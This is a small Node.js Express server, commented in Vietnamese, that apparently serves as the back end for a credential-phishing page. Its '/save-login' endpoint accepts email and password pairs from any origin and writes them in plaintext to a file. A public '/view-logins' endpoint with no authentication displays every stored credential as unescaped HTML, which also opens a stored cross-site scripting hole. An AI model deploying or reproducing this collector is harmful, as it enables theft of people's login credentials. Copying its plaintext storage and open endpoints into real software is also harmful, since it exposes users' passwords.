const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(express.json());
app.use(cors());

// **🔹 Kiểm tra server có hoạt động không**
app.get("/", (req, res) => {
    res.send("✅ Server đang chạy trên Render!");
});

// **🔹 API Lưu Thông Tin Đăng Nhập**
app.post("/save-login", (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ message: "❌ Thiếu email hoặc mật khẩu" });
    }

    const logFilePath = path.join(__dirname, "logins.txt");
    const log = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile(logFilePath, log, (err) => {
        if (err) {
            return res.status(500).json({ message: "❌ Lỗi khi lưu dữ liệu" });
        }
        res.json({ message: "✅ Dữ liệu đã lưu vào logins.txt!" });
    });
});

// **🔹 API Xem Thông Tin Đã Lưu**
app.get("/view-logins", (req, res) => {
    const logFilePath = path.join(__dirname, "logins.txt");

    fs.readFile(logFilePath, "utf8", (err, data) => {
        if (err) {
            return res.status(500).json({ message: "❌ Không thể đọc file!" });
        }
        res.send(`<pre>${data}</pre>`);
    });
});

// **🔹 Chạy server trên Render**
const port = process.env.PORT || 10000;
app.listen(port, "0.0.0.0", () => {
    console.log(`🚀 Server đang chạy trên cổng ${port}`);
});
